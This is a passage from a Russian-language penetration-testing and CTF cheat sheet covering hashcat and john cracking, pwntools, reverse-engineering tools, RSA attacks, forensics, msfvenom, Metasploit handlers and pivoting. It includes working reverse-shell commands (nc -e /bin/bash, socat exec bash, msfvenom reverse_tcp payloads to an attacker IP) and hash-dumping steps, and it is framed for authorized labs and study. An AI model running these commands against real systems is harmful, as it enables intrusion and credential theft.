**Ключевые `-m` (hash-mode):** 0 MD5; 100 SHA1; 1400 SHA256; 1700 SHA512; 1800 sha512crypt ($6$); 500 md5crypt ($1$); 3200 bcrypt ($2*$); 1000 NTLM; 3000 LM; 5500 NetNTLMv1; 5600 NetNTLMv2; 13100 Kerberoast (TGS-REP); 18200 AS-REP; 2100 DCC2; 22000 WPA-PBKDF2-PMKID+EAPOL; 16500 JWT (HS); 13400 KeePass; 9600 Office2013; 10500 PDF; 10000 Django(PBKDF2-SHA256); 7500 Kerberos AS-REQ.
**Прочее:** `-r rules/best64.rule` (правила мутации); `-O` (optimized kernel, ограничение длины пароля); `-w 1..4` (workload, 3-4 для выделенной машины); `--force` (игнор предупреждений); `--show` (показать взломанное); `-o cracked.txt`; `-d 1` (GPU); `--restore`.
**Синтаксис правил:** `c`=capitalize, `l`/`u`=регистр, `$X`=добавить X в конец, `^X`=в начало, `sXY`=замена.
```bash
hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule
hashcat -m 13100 kerb.txt rockyou.txt -O -w 3
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 22000 wifi.22000 -a 3 ?d?d?d?d?d?d?d?d
hashcat -m 1000 ntlm.txt --show
```

## 36. john (John the Ripper) — CPU-крекер + *2john
**Установка:** `sudo apt install john`.
- `--wordlist=rockyou.txt`; `--rules` (или `--rules=Jumbo`); `--format=NT|krb5tgs|raw-md5|sha512crypt` (`--list=formats`); `--show hash.txt` (взломанное); `--incremental` (брутфорс по марковской модели); `--mask=?l?l?l?d`; `--fork=4`; `--session=name`/`--restore`.
- **Хелперы *2john** (создают хеш для john/hashcat): `zip2john file.zip`, `rar2john`, `ssh2john id_rsa`, `pdf2john`, `office2john`, `keepass2john file.kdbx`, `7z2john`.
```bash
zip2john secret.zip > h.txt; john --wordlist=rockyou.txt h.txt; john --show h.txt
ssh2john id_rsa > h; john --wordlist=rockyou.txt h
john --format=krb5tgs --wordlist=rockyou.txt kerb.txt
```

## 37. hashid / hash-identifier
- **hashid:** `hashid '<hash>'`; `-m` (показать hashcat-режим); `-j` (john-формат); `-e` (расширенный).
- **hash-identifier:** интерактивный. Ориентиры: 32 hex = MD5(0)/NTLM(1000); 40 = SHA1(100); 64 = SHA256(1400); `$1$`=md5crypt(500); `$2*$`=bcrypt(3200); `$6$`=sha512crypt(1800); `$krb5tgs$`=13100; `$krb5asrep$`=18200.

## 38. cewl / crunch — генерация словарей
- **cewl:** `cewl http://t -w out.txt -d 3 -m 5` (`-d` глубина краулинга, `-m` мин. длина слова, `-w` вывод, `--with-numbers`, `-e` email).
- **crunch:** `crunch <min> <max> [charset] -t <pattern> -o out.txt`; шаблон: `@`=lower, `,`=upper, `%`=digit, `^`=symbol. Пример: `crunch 8 8 -t Pass@@%% `.

---

# BINARY EXPLOITATION / PWN

## 39. gdb + pwndbg / GEF
**Установка:** `gdb`; pwndbg (`github.com/pwndbg/pwndbg`) или GEF (`hugsy.github.io/gef`).

**Базовый GDB:** `b func`/`b *0x401234` (брейк по адресу); `r [args]`/`gdb --args ./p a b`; `c` continue; `ni`/`si` (шаг по инструкции over/into); `finish`; `info functions [regex]`; `info registers` (`i r`); `info proc mappings`; `x/20gx $rsp` (20 8-байтных слов в hex), `x/i $rip` (инструкция), `x/s addr` (строка); `p (char*)$rdi`; `set $rip=0x...`; `disassemble func`; `watch expr`; `gdb -p PID` (attach).
  - Формат `x/`: count + формат (`x` hex, `d` dec, `i` instr, `s` str) + размер (`b`/`h`/`w`/`g` = 1/2/4/8).

**pwndbg (имена команд через дефис в новых версиях):**
- `cyclic 200` (создать De Bruijn паттерн; `-n 4` для 32-бит); `cyclic -l 0x6161616a` (найти **offset** значения из упавшего регистра).
- `telescope addr [n]` (рекурсивное разыменование указателей); `vmmap` (карта памяти, `-x`/`-w`); `checksec`; `hexdump addr`; `search -s "str"` / `search -p` / `search --asm`; `nearpc`; `distance a b`; `xinfo addr`.
- `got`/`gotplt`/`plt`; `track-got`; `piebase`; `breakrva`; `aslr`.
- `context` (+ секции `regs`/`disasm`/`code`/`stack`/`backtrace`); `regs`; `retaddr` (адреса возвратов на стеке); `canary`.
- Heap: `heap`; `bins`; `fastbins`/`tcache`/`smallbins`/`unsortedbin`; `malloc-chunk addr`; `top-chunk`; `find-fake-fast addr`; `vis-heap-chunks`; `arena(s)`; `try-free addr`.
- `onegadget`; `rop`/`ropper`; `attachp <pid|name>`.

**GEF:** `pattern create 128` / `pattern search $rsp` (поиск offset, показывает LE/BE); `vmmap`; `checksec`; `dereference addr` (=telescope); `heap chunks`/`heap bins [fast|tcache|...]`; `search-pattern "str"` (алиас `grep`); `got`; `xinfo addr`; `registers`; `context`/`ctx`; `elf-info`; `ropper`; `format-string-helper` (брейки на printf-семейство и проверка writable); `aslr [on|off]`.
```
pwndbg> cyclic 200            # затем r, после краша:
pwndbg> cyclic -l 0x6161616a  # offset до RIP
gef➤ pattern create 200
gef➤ pattern search $rsp
```

## 40. pwntools — Python-фреймворк для эксплойтов
**Установка:** `pip install pwntools`.
- `from pwn import *`; `context.binary = ELF('./vuln')` (ставит arch/bits/endian); `context.log_level='debug'`.
- Подключение: `p = process('./vuln')`; `p = remote('host', 1337)`; `p = gdb.debug('./vuln', gdbscript)`.
- Упаковка: `p64(x)`/`p32(x)` (int→bytes LE), `u64(b)`/`u32(b)` (обратно); `u64(leak.ljust(8,b'\\x00'))` для добивки 6-байтного лика.
- ELF/libc: `elf = ELF('./vuln')`; `elf.symbols['win']`, `elf.got['puts']`, `elf.plt['puts']`, `elf.bss()`; `libc = ELF('./libc.so.6')`; `libc.address = leak - libc.symbols['puts']`; `next(libc.search(b'/bin/sh'))`.
- ROP: `rop = ROP(elf)`; `rop.call('puts', [elf.got['puts']])`; `rop.system(binsh)`; `rop.raw(gadget)`; `payload = rop.chain()`; `print(rop.dump())`.
- I/O: `p.sendline(b'A')`; `p.sendlineafter(b'> ', payload)`; `p.recvuntil(b':')`; `p.recvline()`; `p.interactive()`; `p.clean()`.
- Прочее: `cyclic(200)` / `cyclic_find(0x6161...)`; `asm('mov rax,1')`; `shellcraft.sh()`; `fmtstr_payload(offset, {addr:value}, write_size='byte')`.
```python
from pwn import *
context.binary = e = ELF('./vuln'); libc = ELF('./libc.so.6')
p = process()
p.sendlineafter(b'>', b'A'*72 + p64(rop_chain))
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.symbols['puts']
p.interactive()
```

## 41. checksec — проверка защит бинаря
`checksec --file=./vuln` → RELRO (Partial/Full), Stack Canary, NX, PIE, RPATH/RUNPATH, Fortify. Также доступен внутри pwndbg/gef как `checksec`.

## 42. ROPgadget / ropper — поиск гаджетов
- **ROPgadget:** `ROPgadget --binary ./vuln`; `--ropchain` (авто-цепочка); `--only "pop|ret"`; `--string "/bin/sh"`; `--depth N`.
- **ropper:** `ropper -f ./vuln --search "pop rdi"`; `--search "% ?di"`; `--chain execve`; `--string`; `--type rop|jop`.
```bash
ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ropper -f ./vuln --search "pop rdi; ret"
```

## 43. one_gadget — одношаговые execve("/bin/sh") в libc
**Установка:** `gem install one_gadget`.
`one_gadget ./libc.so.6` → адреса-смещения и **constraints** (условия регистров/стека, которые должны выполняться). Выбирай гаджет, чьи constraints соблюдены в момент перехода.

## 44. patchelf — запуск бинаря с нужной libc
- `--set-interpreter ./ld-2.31.so ./vuln` (сменить динамический загрузчик); `--replace-needed libc.so.6 ./libc.so.6 ./vuln` (подменить нужную библиотеку); `--set-rpath`. Альтернатива: `LD_PRELOAD=./libc.so.6 ./vuln`.
```bash
patchelf --set-interpreter ./ld.so --replace-needed libc.so.6 ./libc.so.6 ./vuln
```

---

# REVERSE ENGINEERING

## 45. radare2 / rizin — фреймворк дизассемблирования
**Установка:** `git clone github.com/radareorg/radare2; sys/install.sh` (rizin — форк, синтаксис близкий).
- Запуск: `r2 -A ./bin` (анализ при загрузке), `-w` (запись/патч), `-d` (дебаг), `-n` (без анализа).
- Анализ: `aaa` (анализировать всё; `aa` быстрее); `afl` (список функций, `afl~?` счёт); `af` (анализ функции); `afn name addr` (переименовать).
- Навигация: `s addr|sym.main` (seek, `s-` undo); `pdf` (дизасм функции), `pd 20` (20 инструкций), `pdb` (basic block); `px` (hexdump); `axt addr` (xref to).
- Инфо: `ii` (импорты), `iz` (строки в data), `izz` (во всём бинаре), `iS` (секции), `is` (символы), `ie` (entrypoint), `ia` (всё).
- Визуальные режимы: `V` (визуальный), `VV` (граф функции), `V!` (панели). Внутри графа: `hjkl` навигация, `t`/`f` true/false ветки, `p`/`P` смена режима, `q` выход.
- Прочее: `~` (grep как `afl~main`), `@` (временный seek), `wa` (write assembly), `wx` (write hex), `| less`, `> file`.
```
r2 -A ./bin
[0x...]> afl
[0x...]> s main; pdf
[0x...]> iz~flag
```

## 46. ghidra — декомпилятор (GUI + headless)
**Установка:** скачать с ghidra-sre.org (нужна Java).
- GUI: New Project → Import → авто-анализ → дабл-клик функции для декомпиляции (окно Decompile), `L` переименовать, `;` коммент.
- Headless (CLI-пакетная обработка): `analyzeHeadless <projDir> <projName> -import ./bin -postScript Script.java -scriptPath .`; `-process`, `-deleteProject`, `-readOnly`.
```bash
analyzeHeadless ~/proj P1 -import ./bin -postScript Decompile.java
```

## 47. ltrace / strace — трассировка вызовов
- **strace:** системные вызовы. `-f` (форки), `-e trace=open,read,network` (фильтр), `-p PID` (attach), `-s 200` (длина строк), `-o out`, `-c` (статистика).
- **ltrace:** вызовы библиотек. `-f`, `-e 'strcmp+strncmp'`, `-s`, `-p`, `-o`. Полезен для подсмотра сравнений паролей (`strcmp`).
```bash
ltrace ./crackme
strace -f -e trace=network ./bin
```

## 48. Декомпиляторы/распаковщики
- **jadx** (Android/Java): `jadx -d out app.apk`; `jadx-gui app.apk`; `--deobf`.
- **dnSpy / ilspycmd** (.NET): GUI dnSpy для просмотра/правки IL/C#; `ilspycmd App.dll > App.cs` (CLI).
- **upx -d** (распаковка UPX): `upx -d packed.bin` (`upx -t` проверить).
- **uncompyle6 / decompyle3 / pycdc** (Python .pyc): `uncompyle6 mod.pyc > mod.py`; `pycdc mod.pyc` (для новых версий Python).
- **objdump -d** (дизасм ELF): `objdump -d -M intel ./bin`; `-s` (содержимое секций); `-T` (динамические символы).
- **file / strings / nm / readelf:** `file bin` (тип); `strings -n 8 bin` / `strings -el bin` (UTF-16LE/широкие строки Windows); `nm bin` (символы); `readelf -h/-S/-d bin` (заголовок/секции/динамика).
```bash
strings -el dump.bin | grep -i flag
objdump -d -M intel ./bin | less
uncompyle6 app.pyc > app.py
```

---

# CRYPTOGRAPHY

## 49. RsaCtfTool + openssl + xortool + hashpump
**RsaCtfTool** (`git clone RsaCtfTool/RsaCtfTool`): автоматический подбор атаки на слабый RSA.
- `--publickey key.pub` (ключ, поддержка wildcard `"*.pub"`); `--uncipherfile cipher` / `--uncipher <int>` (расшифровать); `--private` (вывести приватный ключ); `--dumpkey --key key` (показать n/e/d); `--createpub -n N -e E`; `-n/-p/-q/-e` (параметры вручную); `--attack wiener,hastads,fermat,factordb,boneh_durfee,ecm,...,all`; `--ecmdigits N`; `--timeout`. Атаки: Wiener (малый d), Hastad (малый e), Boneh-Durfee (d<n^0.292), Fermat (близкие p,q), factordb, common factors, и др.
```bash
RsaCtfTool --publickey key.pub --uncipherfile flag.enc
RsaCtfTool --publickey key.pub --private --attack wiener
RsaCtfTool --dumpkey --key key.pub
```
**openssl:** `openssl rsa -in priv.pem -text -noout` (разбор ключа); `openssl x509 -in cert -text -noout` (сертификат); `openssl enc -aes-256-cbc -d -in c -out p -k pass` (симметрика, `-d` decrypt, `-a` base64); `openssl dgst -sha256 file`; `openssl s_client -connect host:443` (вытащить cert).
**xortool:** `xortool file` (поиск длины ключа); `-l N` (длина), `-c 20` (частый байт, например 0x20 для текста), `-x` (hex-вход). Выход в `xortool_out/`.
**hashpump / hash_extender:** атака length extension на MD5/SHA1/SHA256-MAC. hashpump: `-s <known_sig> -d <known_data> -a <append> -k <key_len>` → новые data+signature.
```bash
xortool -c 20 cipher.bin
hashpump -s SIG -d "user=guest" -a "&admin=1" -k 16
```
**factordb:** для известных n проверить `factordb.com` (или `--attack factordb` в RsaCtfTool) — часто маленькие/публичные модули уже факторизованы.

## 50. sage / pycryptodome / CyberChef
- **SageMath:** мощная математика для крипты — `factor(n)`, решётки/LLL, дискретный лог, эллиптические кривые. Запуск: `sage script.sage` или интерактивно.
- **pycryptodome** (`pip install pycryptodome`): `from Crypto.Util.number import long_to_bytes, inverse, getPrime`; `from Crypto.Cipher import AES`; быстрая реализация RSA/AES/паддинга в Python.
- **CyberChef** (gchq.github.io/CyberChef): браузерный «комбайн» рецептов — Base64/hex/XOR/ROT/Magic-детектор, удобно для быстрого декодирования.

---

# FORENSICS & STEGO

## binwalk — анализ/извлечение встроенных файлов
- `binwalk file` (сигнатуры); `-e`/`--extract` (извлечь известные типы); `--dd='png:png'` (карвинг по типу); `-M`/`--matryoshka` (рекурсивно по извлечённому); `-B` (signature scan); `-E` (энтропия); `-R "\\x..."` (поиск строки); `--run-as=root`.
```bash
binwalk -Me image.png
```
- **foremost** (карвинг по заголовкам): `foremost -i file -o outdir` (`-t jpg,pdf`). **bulk_extractor:** `bulk_extractor -o out image.dd` (вытащить email/URL/cc/PII).

## volatility3 — анализ дампов памяти
**Установка:** `pip install volatility3` (бинарь `vol`/`vol.py`). Глобальные опции **до** имени плагина: `-f dump.mem`, `-r json|csv|pretty`, `-o outdir`. В vol3 профиль не нужен (символы качаются авто).
- Windows: `windows.info` (ОС/архитектура), `windows.pslist`/`windows.psscan`/`windows.pstree` (процессы; psscan находит скрытые), `windows.cmdline`, `windows.netscan`/`windows.netstat` (сеть), `windows.hashdump.Hashdump` (SAM-хеши), `windows.lsadump`/`windows.cachedump`, `windows.filescan` + `windows.dumpfiles --virtaddr 0x...`, `windows.malfind` (инъекции), `windows.registry.hivelist`/`printkey`.
- Linux: `linux.pslist`/`linux.psscan`/`linux.pstree`/`linux.psaux`, `linux.bash` (история bash), `linux.netstat`, `linux.check_syscall`, `linux.elfs`, `linux.find_file`.
- **volatility2** (legacy): синтаксис иной — обязателен `--profile=Win7SP1x64`, плагины без префикса (`pslist`, `hashdump -f`, `imageinfo` для определения профиля).
```bash
vol -f mem.dmp windows.info
vol -f mem.dmp windows.pstree
vol -f mem.dmp -r csv windows.netscan | grep ESTABLISHED
vol -f mem.dmp windows.hashdump.Hashdump
strings -el mem.dmp | grep -i "flag{"      # быстрая проверка
```

## wireshark / tshark / tcpdump — анализ трафика
- **tshark:** `-r cap.pcap` (читать); `-Y 'http.request'` (display-фильтр); `-z follow,tcp,ascii,0` (follow stream); `--export-objects http,outdir`; `-T fields -e ip.src -e http.host`; `-c N`; `-w out.pcap`.
- **tcpdump:** `-i eth0`; `-r`/`-w file`; `-n` (без DNS); `-A` (ASCII), `-X` (hex+ASCII); `-s 0` (полный пакет); BPF-фильтр `'tcp port 80'`.
```bash
tshark -r c.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri
tshark -r c.pcap --export-objects http,loot
```

## exiftool / steghide / stegseek / zsteg / outguess / zbarimg / PDF / olevba
- **exiftool file** — метаданные (часто флаг/подсказка в Comment/Author). `-all`, `-Comment`.
- **steghide:** `steghide info file.jpg` (есть ли вложение); `steghide extract -sf file.jpg [-p pass]` (извлечь; пустой пароль — просто Enter); `embed -cf cover -ef secret`. Поддержка JPEG/BMP/WAV/AU.
- **stegseek** (быстрый брут steghide): `stegseek file.jpg rockyou.txt` (прогон rockyou за секунды); `--seed`.
- **zsteg** (PNG/BMP LSB): `zsteg -a file.png` (все методы); `zsteg -E "b1,rgb,lsb,xy" file.png` (извлечь по конкретному payload).
- **outguess:** `outguess -r stego.jpg out.txt` (извлечь), `-k pass`.
- **zbarimg** (QR/штрихкоды): `zbarimg qr.png`.
- **PDF:** `pdfinfo file.pdf`; `pdf-parser.py file.pdf` (объекты/потоки, `--object N`, `--filter`); `pdftotext`.
- **oletools:** `olevba doc.docm` (извлечь/деобфусцировать VBA-макросы); `oleid`, `oledump.py`.
```bash
steghide extract -sf img.jpg -p ''
stegseek img.jpg /usr/share/wordlists/rockyou.txt
zsteg -a img.png
exiftool img.jpg
olevba suspicious.docm
```

---

# EXPLOIT / РЕСУРСЫ / PIVOTING

## searchsploit — оффлайн ExploitDB
- `searchsploit apache 2.4` (поиск); `-m <id>`/`--mirror` (скопировать эксплойт в текущую папку); `-x <id>`/`--examine` (показать); `-p` (полный путь); `-u`/`--update`; `-w` (ссылки); `--nmap scan.xml` (по результатам nmap); `-t` (поиск по title).
```bash
searchsploit -m 12345
searchsploit --nmap nmap.xml
```

## msfvenom — генерация пейлоадов
- `-p payload` (например `windows/x64/meterpreter/reverse_tcp`, `linux/x64/shell_reverse_tcp`, `php/meterpreter/reverse_tcp`, `java/jsp_shell_reverse_tcp`); `LHOST=` / `LPORT=` (для reverse) / `RHOST=`; `-f exe|elf|raw|psh|war|asp|macho|dll|py|c` (формат); `-e x86/shikata_ga_nai` (энкодер); `-i N` (итерации кодирования); `-b '\\x00\\x0a\\x0d'` (плохие байты); `-a x86|x64` + `--platform`; `-o file` (вывод); `-n N` (nopsled); `-s N` (макс. размер); `--list payloads|encoders`; `-x template.exe -k` (внедрить в шаблон).
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f exe -o s.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f elf -o s.elf
msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=443 -f raw -o s.php
msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1 LPORT=443 -b '\x00\x0a' -e x86/shikata_ga_nai -f c
```

## metasploit (msfconsole) — основы
`msfconsole -q`; `search type:exploit name`; `use <module>`; `show options`; `set RHOSTS/LHOST/LPORT`; `set payload ...`; `run`/`exploit` (`-j` фоном); хендлер: `use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ...; set ExitOnSession false; exploit -j`. В meterpreter: `sysinfo`, `getuid`, `hashdump`, `shell`, `download`/`upload`, `portfwd`.

## Reverse shell helpers и стабилизация
- **nc:** листенер `nc -lvnp 443`; коннект `nc IP 443 -e /bin/bash` (или mkfifo-вариант).
- **socat** (стабильнее, TTY): листенер `socat file:`tty`,raw,echo=0 tcp-listen:443`; жертва `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:443`.
- **pwncat-cs:** `pwncat-cs -lp 443` (продвинутый листенер с авто-стабилизацией, persistence, загрузкой/выгрузкой файлов).
- **Стабилизация шелла:** `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm` (полноценный TTY с автодополнением/Ctrl+C).

## Pivoting / туннелирование
- **chisel** (HTTP-туннель + SOCKS): сервер на атакующем `./chisel server -p 8000 --reverse`; клиент на цели `./chisel client ATTACKER:8000 R:socks` (reverse SOCKS5). Прямой проброс порта: `R:88:127.0.0.1:88`. Затем `proxychains <tool>`.
- **ligolo-ng** (L3 через TUN, без proxychains): на атакующем `sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert`; агент на цели `./agent -connect ATTACKER:11601 -ignore-cert`; в консоли `session` → выбрать → `start`; затем `sudo ip route add <subnet>/24 dev ligolo`. Проброс reverse-shell: `listener_add --addr 0.0.0.0:4443 --to 0.0.0.0:1234`.
- **sshuttle** («бедный VPN» через SSH): `sshuttle -r user@pivot 10.1.1.0/24` (`-x` исключить сеть, `-e 'ssh -i key'`). Не требует root на пивоте.
- **proxychains** (конфиг `/etc/proxychains4.conf`): в конце секции `[ProxyList]` добавить `socks5 127.0.0.1 1080`; рекомендуется `socks4`/`socks5` и опция `quiet_mode`; использовать как `proxychains4 -q nmap -sT -Pn <target>`. ICMP/ping через SOCKS не проходит (только TCP).
```bash
# chisel reverse SOCKS
./chisel server -p 8000 --reverse           # атакующий
./chisel client 10.10.14.1:8000 R:socks     # цель
proxychains4 -q nxc smb 172.16.1.0/24
```

---

# Recommendations (стадии работы и пороги переключения)

1. **Разведка (web/HTB):** начни с `nmap -sC -sV` + полного `-p- --min-rate 5000`; на найденных HTTP — `feroxbuster`/`ffuf` + `nuclei -as`. Порог: нашёл нестандартный сервис/CMS → переходи к специализированному тулзу (`wpscan`, `sqlmap`, `dalfox`).
2. **Получение точки опоры:** если есть форма/параметр — `sqlmap`/`ghauri` (SQLi), `dalfox` (XSS), `commix`/`SSTImap` (RCE). При найденных кредах — сразу проверь повторное использование через `netexec` по SMB/WinRM/SSH.
3. **AD:** `kerbrute userenum` (без локаута) → `netexec --pass-pol` (узнать порог локаута) перед спреем → `impacket-GetNPUsers`/`GetUserSPNs` для роста → `bloodhound-python -c All` для путей → `certipy find -vulnerable` при наличии AD CS. Порог: получил хеш → крек `hashcat -m 13100/18200/5600/1000`.
4. **PrivEsc:** `linpeas`/`winpeas` + `pspy` → проверь находки (`sudo -l`, SUID, capabilities) по GTFOBins/LOLBAS; ядро/патчи — exploit-suggester. Меняй вектор, если EDR/патчи закрывают LOLBin.
5. **Pwn/RE/Crypto/Forensics:** для pwn — `checksec` → выбор техники (canary/NX/PIE решают, нужен ли leak/ROP) → `pwntools` + `gdb/pwndbg`. Для crypto — `RsaCtfTool --attack all`, при неудаче ручной анализ в Sage. Для forensics — сначала `strings`/`binwalk`/`exiftool`, затем профильные `volatility3`/`stegseek`/`zsteg`.
6. **Pivoting:** при доступе во вторую сеть — `chisel`/`ligolo-ng`; ligolo предпочтительнее для сканирования (L3, без proxychains), chisel — для быстрого reverse-SOCKS.

# Caveats
- Версии меняют флаги: `crackmapexec` переименован в `netexec` (`nxc`); pwndbg сменил подчёркивания на дефисы в именах команд (`find-fake-fast`, `vis-heap-chunks`); список атак `RsaCtfTool` зависит от версии. Всегда сверяйся с `--help`/`-h`.
- Номера hashcat `-m` и плагины volatility3 эволюционируют (v7.x hashcat добавил Argon2 = 34000; vol3 заменяет часть legacy-плагинов); список плагинов смотри через `vol -f dump.mem windows` (выведет доступные) или `<plugin> -h`.
- `passwordspray`/`bruteuser` (kerbrute) и брут hydra инкрементят badPwd и могут залочить аккаунты — даже в лабе учитывай pass-policy.
- Команда pwndbg `propagate` в текущей документации не найдена (вероятно переименована/удалена); пользуйся `set emulate on` для авто-разрешения значений в контексте.
- Это материал для авторизованных CTF/HTB/пентест-лабораторий; применение против чужих систем без разрешения незаконно.
